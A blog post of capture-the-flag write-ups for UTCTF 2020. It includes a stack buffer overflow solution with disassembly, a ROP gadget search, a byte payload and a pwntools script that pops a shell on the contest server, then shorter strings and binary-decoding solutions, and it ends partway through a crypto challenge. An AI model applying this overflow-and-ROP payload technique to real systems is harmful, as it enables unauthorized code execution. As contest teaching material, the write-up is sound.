---
title: "UTCTF Live 2020 Writeups"
excerpt: "Writeups for various challenges I solved during the UTCTF capture the flag competition."
date: 2020-03-09T09:24:19-05:00
categories:
 - Capture The Flag Writeups
---

# 2020 UTCTF Live Capture The Flag

> A 48 hour CTF hosted by the University of Texas at Austin's [Information & Systems Security Society (ISSS)](https://isss.io/).
>
> Flag format is utflag{}
>
> UTCTF will run from 6PM CST, Fri March 6 - 7PM CDT, Sun March 8 2020
>
> For rules, FAQs, and more, please visit isss.io/utctf
>
> ...


These are writeups to challenges I solved for this CTF. Points next to the name were what they were worth when I solved it. They are now all 50 points. I tried to also keep a copy of each referenced "download XXXX" file for a challenge in a dedicated [files](https://github.com/bigpick/UTCTF-2020/tree/master/files) directory.

## Solved

| Binary Exploitation      | Networking      | Reverse Engineering      | Web    | Crypto    | Forensics|
|--------------------------|-----------------|--------------------------|--------|-----------|----------|
|[bof](#bof----50-points)  | ----            | [Basics](#basics-reverse-engineering----50) | --- | [Basics](#basics-crypto----50) | [Sanity check](#sanity-check----1) |
| | | | | | [Observe Closely](#observe-closely----50)|
| | | | | | [Basics](#basics-forensics----50) |
| | | | | | [Zero](#zero----1858)|
| | | | | | [Spectre](#spectre----50)|
| | | | | | [1 Frame per minute](#1-frame-per-minute----50)|

&nbsp;
&nbsp;
---

# Binary Exploitation

## bof -- 50 points
> nc binary.utctf.live 9002

And a download: `bof_pwnable`.

Hitting the endpoint:

```bash
nc binary.utctf.live 9002
I really like strings! Please give me a good one!
lulz
Thanks for the string
```

Peeking at the file we download:

```bash
file bof_pwnable
bof_pwnable: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=017761d89d9e70fa132c5dca9e2de20a44672698, not stripped
```

In peda:

```nasm
disas main
Dump of assembler code for function main:
   0x00000000004005b6 <+0>:	push   rbp
   0x00000000004005b7 <+1>:	mov    rbp,rsp
   0x00000000004005ba <+4>:	sub    rsp,0x70
   0x00000000004005be <+8>:	mov    edi,0x4006b8
   0x00000000004005c3 <+13>:	call   0x400470 <puts@plt>
   0x00000000004005c8 <+18>:	lea    rax,[rbp-0x70]
   0x00000000004005cc <+22>:	mov    rdi,rax
   0x00000000004005cf <+25>:	mov    eax,0x0
   0x00000000004005d4 <+30>:	call   0x4004a0 <gets@plt>
   0x00000000004005d9 <+35>:	mov    edi,0x4006ea
   0x00000000004005de <+40>:	call   0x400470 <puts@plt>
   0x00000000004005e3 <+45>:	mov    eax,0x1
   0x00000000004005e8 <+50>:	leave
   0x00000000004005e9 <+51>:	ret
End of assembler dump.

info functions
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400470  puts@plt
0x0000000000400480  __libc_start_main@plt
0x0000000000400490  execve@plt
0x00000000004004a0  gets@plt
0x00000000004004b0  __gmon_start__@plt
0x00000000004004c0  _start
0x00000000004004f0  deregister_tm_clones
0x0000000000400530  register_tm_clones
0x0000000000400570  __do_global_dtors_aux
0x0000000000400590  frame_dummy
0x00000000004005b6  main
0x00000000004005ea  get_flag
0x0000000000400630  __libc_csu_init
0x00000000004006a0  __libc_csu_fini
0x00000000004006a4  _fini
```

OK - `get_flag` looks like the function we want:

```nasm
disas get_flag
Dump of assembler code for function get_flag:
   0x00000000004005ea <+0>:	push   rbp
   0x00000000004005eb <+1>:	mov    rbp,rsp
   0x00000000004005ee <+4>:	sub    rsp,0x20
   0x00000000004005f2 <+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004005f5 <+11>:	cmp    DWORD PTR [rbp-0x14],0xdeadbeef
   0x00000000004005fc <+18>:	jne    0x400628 <get_flag+62>
   0x00000000004005fe <+20>:	mov    QWORD PTR [rbp-0x10],0x400700
   0x0000000000400606 <+28>:	mov    QWORD PTR [rbp-0x8],0x0
   0x000000000040060e <+36>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400612 <+40>:	lea    rcx,[rbp-0x10]
   0x0000000000400616 <+44>:	mov    edx,0x0
   0x000000000040061b <+49>:	mov    rsi,rcx
   0x000000000040061e <+52>:	mov    rdi,rax
   0x0000000000400621 <+55>:	call   0x400490 <execve@plt>
   0x0000000000400626 <+60>:	jmp    0x400629 <get_flag+63>
   0x0000000000400628 <+62>:	nop
   0x0000000000400629 <+63>:	leave
   0x000000000040062a <+64>:	ret
End of assembler dump.
```

But there's no call or reference to `get_flag` in main? So, it seems like we need to do two things:

1. Manipulate an address in main such that we jump to `get_flag`
2. Get `0xdeadbeef` into edi, so when we are in that function, we pass the comparison check.

I tried quite a few things here, and thanks to some team member help, got pointed in the correct direction.

First, I tried:

```bash
python -c "from pwn import *; print 'a'*(112)+p64(0xdeadbeef)+p64(0x4005ea)" > bof_payload
```

And then ran that in peda:

```nasm
break *get_flag
Breakpoint 1 at 0x4005ea

run <initial_payload
Starting program: /root/bof_pwnable <initial_payload
I really like strings! Please give me a good one!
Thanks for the string
[----------------------------------registers-----------------------------------]
RAX: 0x1
RBX: 0x0
RCX: 0x7ffff7ecb317 (<__GI___libc_write+23>:	cmp    rax,0xfffffffffffff000)
RDX: 0x0
RSI: 0x6022a0 ("Thanks for the string\n Please give me a good one!\n")
RDI: 0x7ffff7fa74c0 --> 0x0
RBP: 0xdeadbeef
RSP: 0x7fffffffe5d0 --> 0x0
RIP: 0x4005ea (<get_flag>:	push   rbp)
R8 : 0x16
R9 : 0x0
R10: 0x400353 --> 0x7475700073746567 ('gets')
R11: 0x246
R12: 0x4004c0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe6a0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4005e3 <main+45>:	mov    eax,0x1
   0x4005e8 <main+50>:	leave
   0x4005e9 <main+51>:	ret
=> 0x4005ea <get_flag>:	push   rbp
   0x4005eb <get_flag+1>:	mov    rbp,rsp
   0x4005ee <get_flag+4>:	sub    rsp,0x20
   0x4005f2 <get_flag+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x4005f5 <get_flag+11>:	cmp    DWORD PTR [rbp-0x14],0xdeadbeef
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe5d0 --> 0x0
0008| 0x7fffffffe5d8 --> 0x7fffffffe6a8 --> 0x7fffffffe8a8 ("/root/bof_pwnable")
0016| 0x7fffffffe5e0 --> 0x100000000
0024| 0x7fffffffe5e8 --> 0x4005b6 (<main>:	push   rbp)
0032| 0x7fffffffe5f0 --> 0x0
0040| 0x7fffffffe5f8 --> 0x5500f6f0ea605e5f
0048| 0x7fffffffe600 --> 0x4004c0 (<_start>:	xor    ebp,ebp)
0056| 0x7fffffffe608 --> 0x7fffffffe6a0 --> 0x1
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004005ea in get_flag ()
```

Cool, so we get into `get_flag`. Unfortunately, as seen in the `register` section of the `context all` that get's displayed when we hit a break point, we can see that `deadbeef` isn't actually where we need it:

```nasm
...
RDI: 0x7ffff7fa74c0 --> 0x0
RBP: 0xdeadbeef
RSP: 0x7fffffffe5d0 --> 0x0
RIP: 0x4005ea (<get_flag>:	push   rbp)
...
```
So if we continue here in peda, we'll see it just ends, since we fail the check for `deadbeef`:

```nasm
   0x4005f2 <get_flag+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x4005f5 <get_flag+11>:	cmp    DWORD PTR [rbp-0x14],0xdeadbeef
```

So we need a way to write `deadbeef` into RDI. We can use `ropper` to try to find a function that pops to rdi:

```bash
ropper --file bof_pwnable --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi
[INFO] File: pwnable
0x0000000000400693: pop rdi; ret;
```

OK - so looks like we can use the address at `0x400693` to pop whatever is on the stack into RDI. So we need to now:

1. Fill up the buffer (which is size 112 + 8 bytes)
2. Overwrite the return address main puts on the stack with an address a function which will pop whatever we have on the stack into rdi (`0x400693`)
3. Put `0xdeadbeef` onto the stack, so we can get it into RDI.
4. Finally, put the address of `get_flag` so we jump there now that everything is setup.


We can how to formulate our payload in the steps above because looking at the _decompiled_ main function, it yields:

```c
undefined8 main(void)
{
  char local_78 [112];
  puts("I really like strings! Please give me a good one!");
  gets(local_78);
  puts("Thanks for the string");
  return 1;
}
```

So the `local_78[112]` must be our input buffer, so we know it's size is 112. The following additional 8 bytes that we just fill with random bytes is so that we can then hop over the current base pointer. The base pointer is initialized for each function/stack frame, and we just need to clobber it to get to what we really want: the return pointer. Once we're there, we can basically write a different address to "return" to wherever we want. In this case, the address of the function that will pop whatever we have on the stack (which we'll make `0xdeadbeef`) into RDI. This is because the `get_flag` function is expecting the argument to be in that register, so even if we clobber the base pointer but get into `get_flag`, it won't do us any good without the hex string being in RDI already.

Once we've finally set that up, we can add the address of get_flag, so we hop there once we're done executing the above.


All in all, the payload (after some trial and error):

```bash
python -c "from pwn import *; print 'a'*(112)+b'\xa2\xacvm\xeeU\x0f\xc0'+p64(0x400693)+p64(0xdeadbeef)+p64(0x4005ea)" > bof_payload
```

Running it:

```bash
(cat bof_payload && cat) | nc binary.utctf.live 9002
I really like strings! Please give me a good one!
Thanks for the string
ls
flag.txt
cat flag.txt
utflag{thanks_for_the_string_!!!!!!}
^C
```
Woot! Flag is `utflag{thanks_for_the_string_!!!!!!}`.

Here, the random 8 bytes are `... +b'\xa2\xacvm\xeeU\x0f\xc0'+ ...` which I generated in Python3 like so:

```python
>>> import secrets
>>> secrets.token_bytes(8)
```

### Using pwntools
For educational purposes, I wanted to write this in python using `pwntools`. This is what it ended up being:

```python
#!/usr/bin/env python2
from pwn import *

payload = 'a'*(112)+b'\xa2\xacvm\xeeU\x0f\xc0'+p64(0x400693)+p64(0xdeadbeef)+p64(0x4005ea)

conn = remote('binary.utctf.live', 9002)
conn.sendline(payload)
conn.interactive()
```

And then running it:

```bash
./bof.py
[+] Opening connection to binary.utctf.live on port 9002: Done
[*] Switching to interactive mode
I really like strings! Please give me a good one!
Thanks for the string
$ ls
flag.txt
$ cat flag.txt
utflag{thanks_for_the_string_!!!!!!}
$
[*] Interrupted
[*] Closed connection to binary.utctf.live port 9002
```
Sweet!

&nbsp;
&nbsp;
---

# Networking
None :(

# Reverse Engineering

## [basics] reverse engineering -- 50
> I know there's a string in this binary somewhere.... Now where did I leave it?

Download `calc`, then check `strings`:

```bash
strings calc | grep ut
utflag{str1ngs_1s_y0ur_fr13nd}
```

Boom.

Flag is `utflag{str1ngs_1s_y0ur_fr13nd}`.

&nbsp;
&nbsp;
---

# Web
None :(

# Cryptography

## [basics] crypto -- 50
> Can you make it through all of the encodings?

Download the file: `binary.txt`.

```bash
file binary.txt
binary.txt: ASCII text, with very long lines
```

OK - `cat`:

```bash
cat binary.txt
01010101 01101000 00101101 01101111 01101000 00101100 00100000 01101100 01101111 01101111 01101011 01110011 00100000 01101100 01101001 01101011 01100101 00100000 01110111 01100101 00100000 01101000 01100001 01110110 01100101 00100000 01100001 01101110 01101111 01110100 01101000 01100101 01110010 00100000 01100010 01101100 01101111 01100011 01101011 00100000 01101111 01100110 00100000 01110100 01100101 01111000 01110100 00101100 00100000 01110111 01101001 01110100 01101000 00100000 01110011 01101111 01101101 01100101 00100000 01110011 01101111 01110010 01110100 00100000 01101111 01100110 00100000 01110011 01110000 01100101 01100011 01101001 01100001 01101100 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00101110 00100000 01000011 01100001 01101110 00100000 01111001 01101111 01110101 00100000 01100110 01101001 01100111 01110101 01110010 01100101 00100000 01101111 01110101 01110100 00100000 01110111 01101000 01100001 01110100 00100000 01110100 01101000 01101001 01110011 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00100000 01101001 01110011 00111111 00100000 00101000 01101000 01101001 01101110 01110100 00111010 00100000 01101001 01100110 00100000 01111001 01101111 01110101 00100000 01101100 01101111 01101111 01101011 00100000 01100011 01100001 01110010 01100101 01100110 01110101 01101100 01101100 01111001 00101100 00100000 01111001 01101111 01110101 00100111 01101100 01101100 00100000 01101110 01101111 01110100 01101001 01100011 01100101 00100000 01110100 01101000 01100001 01110100 00100000 01110100 01101000 01100101 01110010 01100101 00100000 01101111 01101110 01101100 01111001 00100000 01100011 01101000 01100001 01110010 01100001 01100011 01110100 01100101 01110010 01110011 00100000 01110000 01110010 01100101 01110011 01100101 01101110 01110100 00100000 01100001 01110010 01100101 00100000 01000001 00101101 01011010 00101100 00100000 01100001 00101101 01111010 00101100 00100000 00110000 00101101 00111001 00101100 00100000 01100001 01101110 01100100 00100000 01110011 01101111 01101101 01100101 01110100 01101001 01101101 01100101 01110011 00100000 00101111 00100000 01100001 01101110 01100100 00100000 00101011 00101110 00100000 01010011 01100101 01100101 00100000 01101001 01100110 00100000 01111001 01101111 01110101 00100000 01100011 01100001 01101110 00100000 01100110 01101001 01101110 01100100 00100000 01100001 01101110 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00100000 01110100 01101000 01100001 01110100 00100000 01101100 01101111 01101111 01101011 01110011 00100000 01101100 01101001 01101011 01100101 00100000 01110100 01101000 01101001 01110011 00100000 01101111 01101110 01100101 00101110 00101001 00001010 01010100 01101101 01010110 00110011 01001001 01000111 01001110 01101111 01011001 01010111 01111000 01110011 01011010 01010111 00110101 01101110 01011010 01010011 01000101 01100111 01010001 00110010 01000110 01110101 01001001 01001000 01101100 01110110 01100100 01010011 01000010 01101101 01100001 01010111 01100100 00110001 01100011 01101101 01010101 01100111 01100010 00110011 01010110 00110000 01001001 01001000 01100100 01101111 01011001 01011000 01010001 01101110 01100011 01111001 01000010 01101110 01100010 00110010 01101100 01110101 01011010 01111001 01000010 01110110 01100010 01101001 01000010 01101111 01011010 01011000 01001010 01101100 01010000 01111001 01000010 01001010 01100100 01000011 01000010 01110011 01100010 00110010 00111001 01110010 01100011 01111001 01000010 01110011 01100001 01010111 01110100 01101100 01001001 01001000 01010010 01101111 01011010 01010011 01000010 01110011 01011010 01011000 01010010 00110000 01011010 01011000 01001010 01111010 01001001 01000111 01000110 01111001 01011010 01010011 01000010 01111010 01100001 01000111 01101100 01101101 01100100 01000111 01010110 01101011 01001001 01000111 01001010 00110101 01001001 01001000 01001110 01110110 01100010 01010111 01010101 01100111 01011001 00110010 00111001 01110101 01100011 00110011 01010010 01101000 01100010 01101110 01010001 01110101 01001001 01000011 01101000 01101111 01100001 01010111 00110101 00110000 01001111 01101001 01000010 00110101 01100010 00110011 01010101 01100111 01100010 01010111 01101100 01101110 01100001 01001000 01010001 01100111 01100100 00110010 01000110 01110101 01100100 01000011 01000010 00110000 01100010 01111001 01000010 01111010 01100100 01000111 01000110 01111001 01100100 01000011 01000010 01110011 01100010 00110010 00111001 01110010 01100001 01010111 00110101 01101110 01001001 01001000 01010110 01110111 01001001 01000110 01001010 01110110 01100010 01010111 01000110 01110101 01001001 01001000 01000010 01101100 01100010 00110011 01000010 01110011 01011010 01010011 01101011 01110101 01000011 01101101 01110100 00110010 01011001 01101110 01001110 01111000 01100011 01101101 01010001 01110011 01001001 01000111 01101100 00110101 01011010 01010011 01100100 01101001 01100010 01111001 01000010 01110010 01100100 01101110 01100100 00110101 01011001 00110010 01010001 01100111 01011010 01001000 01001010 01110110 01011001 01101101 00111000 01101000 01001001 01000110 01101000 00110101 01011010 01111001 01000010 01110111 01100101 01010111 01001001 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01000010 01111010 01100101 01000111 01110100 00110010 01001001 01000011 01101000 01110010 01100101 01000111 00110100 01100111 01100100 00110010 01110100 01110000 01100010 01000111 00111000 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01001010 01110010 01011001 01101101 00110101 01110110 01011001 00110010 01010001 01110101 01001100 01101001 00110100 01110000 01001001 01001000 01110000 01110010 01011001 01101101 01010001 00110110 01001001 01000111 01110011 01100111 01011001 00110010 01010110 01110011 01011001 00110010 01010010 01111010 01011010 01000111 01010110 01101011 01100011 00110011 01101100 00110100 01001001 01000111 00110001 01111010 01100101 01101110 01001010 01110110 01011001 01101001 00110100 01100111 01010101 00110011 01100111 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01000010 00110101 01100100 01101110 01011010 00110101 01011010 00110011 01001110 00110100 01100011 01010011 01000010 01101011 01100010 00110010 01101000 01101011 01001100 01000011 01000010 01010100 01001010 00110010 01011010 01110110 01001001 01000111 01010010 01110010 01100100 01010111 00111001 00110100 01001001 01001000 01100100 01110000 01001001 01001000 01100100 01110110 01011001 00110010 01001110 01110010 01100011 01010111 00111000 01100111 01100001 00110011 01101000 01110101 01001001 01000111 01001010 01110110 01100101 01101110 01011010 01110010 01100010 01010111 00111001 01110101 01001001 01000111 00111001 01101101 01100010 00110010 01001010 01110000 01001001 01000111 01110100 00110010 01100101 01101110 01001010 01110010 01100010 01000111 00111001 01101011 01100011 00110010 00110000 01100111 01100010 01011000 01001010 01110010 01011001 01101101 01110100 01110100 01011010 01000111 00111001 01101001 01001001 01000111 01100100 01111010 01011010 01001000 01001001 01100111 01100001 01111001 01000010 01110100 01100101 01010111 01001010 01101001 01100010 00110010 01001110 00110110 01100101 01011000 01101000 01110101 01100010 00110011 01101000 01110100 01100010 01111001 01000010 01101011 01100101 01010011 01000010 01110010 01001001 01000111 00110101 01111010 01100011 01001000 01000010 01110110 01011001 01101101 00111001 00110100 01011010 01000011 01000010 01110100 01100011 01101101 01110100 01101001 01100001 00110010 00110001 01101011 01100010 00110010 01001001 01100111 01001100 01010011 01000010 00110001 01100101 01001000 01101100 01101110 01100101 01000011 01000010 01110010 01011001 01111001 01000010 01110010 01001001 01000111 01001110 01101100 01100010 01000111 01001110 01101011 01100011 00110010 01010010 01101100 01011010 01001000 01001110 00110101 01100101 01000011 01000010 01110100 01100011 00110011 01110000 01111001 01100010 00110010 01001001 01110101 01001001 01000101 00110001 01110010 01100101 01000011 01000010 01110000 01100101 01010111 01010101 01100111 01100011 01001000 01001110 00110100 01100010 01101001 01000010 01101011 01100011 01101101 00111000 01100111 01100011 01001000 01001110 00110100 01100001 00110011 01011001 01100111 01100011 01001000 01011010 01110010 01100011 01010100 00111000 01100111 01100011 01101110 01001110 00110100 01011010 01000100 01101111 01100111 01010010 00110010 00111000 01100111 01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 01000111 01010010 01111001 01100010 01111001 01000010 01110111 01100100 01101101 01110100 01111000 01001001 01001000 01001110 01101010 01001001 01001000 01000110 00110101 01100011 00110011 01101000 01111000 01001001 01000111 01010010 00110101 01001001 01000111 01111000 01110110 01001001 01001000 01101100 01110111 01001001 01000111 01010010 01111001 01100010 01111001 01000010 01110111 01100101 01010111 01001010 00110011 01100001 00110010 01010001 01100111 01011010 01010111 01010010 01110111 01100100 01101101 01110100 01111000 01100101 01111001 00110100 01110101 01001100 01101110 00110000 01100111 01001100 01010011 01000010 01101110 01100011 01101110 01001110 01110100 01100011 01101001 01000010 00110011 01100010 00110010 01110100 00110100 01011001 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 01001000 01001110 01110111 01001001 01000111 01101100 00110101 01011010 01010011 01000010 01101010 01100010 00110010 00111000 01100111 01011010 01001000 01001010 01110010 01011010 01000011 01000010 00110110 01100001 00110010 01010010 01101011 01100010 00110010 01001010 00110100 01001100 01000011 01000010 01110000 01100101 01010111 01010101 01100111 01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101110 01100011 01101101 01110100 01101011 01001001 01000111 01010010 01111001 01100010 01111001 01000010 01110100 01100101 01010111 01001010 01101001 01100010 00110010 01001110 00110110 01100101 01011000 01101000 01110101 01100010 00110011 01101000 01110100 01100010 00110010 01001101 01100111 01100011 01001000 01101100 01101001 01001001 01000111 01010101 01110011 01001001 01000111 01010001 01110011 01001001 01001000 01000001 01110011 01001001 01001000 01011001 01100111 01100001 01111001 01110111 01100111 01100001 00110011 01101000 01110101 01001001 01001000 01000101 01100111 01100001 00110010 01001010 01110110 01001100 01101001 01000010 01001010 01100101 01010111 01010101 01100111 01100010 01010111 01110100 00110100 01001001 01001000 01110000 01101001 01100101 01010111 01111000 01110010 01100010 01001000 01011010 01110000 01001001 01000111 01100100 00110101 01011001 01101110 01010101 01100111 01100101 01010111 01010110 01101011 01001001 01000111 01010010 01111001 01100010 01111001 01000010 01101001 01100010 00110011 01100100 01110010 01100011 00110011 01101000 01111010 01100101 01001000 01000101 01100111 01100010 01011000 01001010 01110010 01011001 01101101 01110100 01110100 01011010 01000111 00111001 01101001 01011001 01111001 01000010 01110011 01100001 01010011 01000010 01101001 01100010 00110011 01110000 00110010 01100001 00110010 00110001 01111010 01100101 01001000 01000101 01100111 01011010 01001000 01001010 01110110 01100100 01111001 01000010 01110010 01100101 01000111 00110100 01100111 01100011 00110011 01101000 01110111 01100010 00110010 01001010 01101001 01100011 00110011 01101000 01111000 01001001 01000111 00110001 00110101 01100100 00110011 01100100 00110101 01100101 01000011 01000010 01101110 01100101 01010111 01001010 01110101 01011001 01111001 01000010 01111010 01100101 01000011 01000010 01101011 01100011 01101101 00111000 01100111 01010100 00110011 01101000 01111000 01100100 01101110 01001110 01101010 01100011 01101001 01000010 00110010 01100001 00110011 01101000 01111000 01011010 01010111 01110100 01111000 01100010 01111001 00110100 01100111 01010011 00110011 01101000 00110101 01011010 01001000 01001010 01110110 01011001 01101001 01000010 01111000 01011001 01101101 00111001 01110010 01011010 01000011 01000010 00110011 01100010 00110010 01010010 01111001 01100101 01010111 00110100 01100111 01100011 00110010 01001101 01100111 01011010 01001000 01101011 01100111 01011010 01010111 01001110 01110110 01001001 01001000 01000010 01101001 01100010 00110010 01000110 01101100 01100010 00110011 01101000 01110100 01100001 01010011 01000010 01110010 01100101 01000111 01110100 00110010 01100001 01010111 01001110 01111010 01011001 01111010 01101111 01100111 01011010 00110010 00111000 01100111 01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 01000011 01100100 01110110 01001010 01111001 01000010 01101010 01100011 01101110 01101100 01101110 01011001 01111001 01000010 01101100 01100101 01101001 01000010 00110011 01100101 01010111 01001110 01101011 01001001 01001000 01101100 01110111 01011010 01000111 00111001 00110100 01001001 01001000 01001110 00110100 01001001 01000111 01010010 01111001 01100010 01111001 01000010 01110010 01100100 01101110 01110000 01111001 01100001 00110010 01111000 01110110 01011010 01000011 01110111 01100111 01011001 00110011 01101011 01100111 01011010 01001000 01001010 01110010 01011010 01000011 01100100 01101010 01001001 01001000 01110000 01101001 01100101 01010111 01111000 01110010 01100010 01001000 01011010 01110000 01001001 01000111 01010010 01111001 01100010 01111001 01000010 00110011 01100101 01010111 01001110 01101011 01001001 01000111 00110001 00110101 01100100 00110011 01100100 00110101 01100101 01000011 01000010 01110100 01100011 01101101 01110100 01101001 01100001 00110010 00110001 01101011 01100010 00110010 01001001 01100111 01100011 00110011 01100111 01100111 01011010 01001000 01001010 01110110 01001001 01000111 01010010 01110110 01100001 01000111 01010001 01110011 01001001 01001000 01000010 00110101 01100100 01101110 01011010 00110101 01011010 00110010 00111001 01110101 01001001 01000111 01111000 01110000 01001001 01000011 01100100 01101011 01001010 01111001 01110111 01100111 01100001 00110011 01101000 01110101 01001001 01000111 01001110 00110101 01001001 01001000 01101100 00110100 01001100 01101001 01000010 01011010 01100101 01000111 00110001 01110110 01001001 01000111 01101100 00110101 01011010 01010011 01000010 00110001 01100101 01001000 01101100 01101110 01001001 01000111 01110011 01100111 01100011 01000111 00111001 01101110 01001001 01000111 00110001 01111001 01100001 00110010 01001010 01110010 01100010 01010111 01010010 01110110 01011001 01101101 01001101 01110011 01001001 01000111 01101100 00110101 01011010 01010011 01000010 01110100 01100001 00110011 01100111 01100111 01100011 00110011 01101000 01110111 01100010 00110010 01001001 01100111 01011010 01001000 01001010 01110110 01001001 01000111 01001010 01110110 01011001 00110010 01010001 01100111 01100101 01011000 01000001 01100111 01011010 01001000 01001010 01110110 01001001 01000111 01100100 00110101 01011001 01101101 00110101 01101010 01001001 01000111 01111000 01110010 01011001 00110010 00111001 01110101 01001001 01001000 01101100 00110100 01001001 01000111 00110001 00110101 01100100 00110011 01100100 00110101 01100101 01000011 01000010 01101110 01100101 01010111 01001010 01110101 01011001 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 01000111 01001110 01111001 01100101 01010111 01100011 01100111 01011010 01011000 01101111 01100111 01100011 00110011 01100111 01100111 01011010 01001000 01001010 01110110 01001001 01000101 00111001 00110100 01100011 01011000 01011010 01111010 01011001 00110011 01001001 01100111 01100100 01101101 01110100 00110100 01100011 01010111 01010110 01110010 01100011 01010111 00111000 01110101 01000011 01101110 01001010 01101110 01100001 01000111 00110101 00110100 01100011 00110010 01010010 01101101 01100101 01011000 01001110 01101011 01100100 01000111 01100100 01101111 01100100 01010011 01000101 01100111 01100011 01010111 01100100 01101101 01001001 01000111 01101100 01111010 01011001 01010111 01110011 01100111 01011001 00110011 01010010 01101111 01100100 01001000 01010110 01110000 01100001 00110010 01010101 01100111 01011010 01000111 01101100 01110010 01001001 01001000 01110000 01110010 01100010 01101110 01010010 01101111 01100001 01000111 01110100 00110100 01001001 01001000 01001010 00110100 01100011 01010111 01111000 01101011 01011010 00110010 00110101 00110100 01100011 00110010 01111000 01110000 01100011 01010011 01000010 01111001 01100001 01011000 01001110 00110101 01100101 01010111 01110100 01101111 01100010 01101101 01110011 01110101 01001001 01000111 01101100 01110010 01100101 01000111 01110011 01100111 01100100 01001000 01010101 01100111 01100011 01111001 01000010 01101010 01100101 01011000 01001110 01110101 01001001 01000111 01001110 01101110 01100101 01000011 01000010 01111010 01100101 01011000 01101011 01100111 01100011 01010111 01100100 01101101 01100101 01000011 01000010 01110000 01100011 00110011 01101000 01101100 01001001 01000111 01110100 01101010 01011001 00110010 01100100 00110100 01011010 01001000 01010101 00110110 01001001 01000111 01011010 01101011 01011001 00110011 01101100 01111010 01100010 01101110 01110100 01101111 01001101 01001000 01011010 01100110 01011010 01000111 01101011 00110000 01011010 01001000 01010110 01100110 01100100 01101101 01101011 00110000 01011010 01000110 00111001 00110000 01011000 00110011 01001001 00110000 01100101 01011000 01101100 01100110 01100011 01101110 01101000 01111000 01100010 01000111 01010001 01110111 01100110 01010011 00110100 01100111 01100011 01010111 01100100 01101101 01001001 01001000 01011010 00110000 01100101 01011000 01101011 01100111 01011001 00110011 01010010 01101111 01011010 01010011 01000010 01101011 01100001 01011000 01001110 01101011 01001001 01001000 01001101 01100111 01100101 01010111 01100100 01101011 01001001 01000111 01100100 01101010 01001001 01001000 01001010 00110100 01100011 01010111 01111000 01101011 01011010 00110010 00110101 00110100 01100011 00110010 01111000 01110000 01100011 01010011 01000010 00110000 01100100 01010011 01000010 01110111 01011010 01101110 01010110 01101011 01001001 01001000 01110000 01101101 01100100 01001000 01101100 01101100 01100100 01000111 01101000 01110101 01001001 01000111 01100100 01101010 01011001 01111001 01000010 01101011 01100001 01011000 01010010 00110001 01001001 01001000 01010110 01101110 01100101 01000111 01010001 01100111 01011010 00110010 01001101 01100111 01100101 01101110 01001110 00110001 01100100 01001000 01001001 01100111 01011001 01101101 01101000 01101110 01100100 01101110 01101100 01110010 01011010 01010111 00110101 01110010 01001100 01000011 01000010 01111010 01100001 01000111 01010101 01100111 01100100 01000111 01010001 01100111 01100101 01000111 01110100 01111010 01100101 01011000 01101100 01111000 01001001 01001000 01010010 00110001 01001001 01000111 01101000 01101110 01011010 01000011 01000010 00110001 01011010 01111001 01000010 00110110 01100011 00110010 01010101 01100111 01100011 00110010 01001110 01101011 01100001 00110011 01100111 01100111 01100011 00110011 01101100 00110101 01001100 01101001 01000010 01110000 01011010 00110010 01111000 01110010 01001001 01001000 01000110 01101110 01011010 01101001 01000010 01110010 01100001 01001000 01000010 01101110 01100011 01010111 01110100 01101100 01001001 01000111 01010010 01110000 01100001 01111001 01000010 01111001 01100001 01011000 01001110 00110101 01100101 01010111 01110100 01101111 01100010 01101101 01110011 01101000
```

OK - to ASCII:

```bash
cat binary.txt| perl -lape '$_=pack"(B8)*",@F'
Uh-oh, looks like we have another block of text, with some sort of special encoding. Can you figure out what this encoding is? (hint: if you look carefully, you'll notice that there only characters present are A-Z, a-z, 0-9, and sometimes / and +. See if you can find an encoding that looks like this one.)
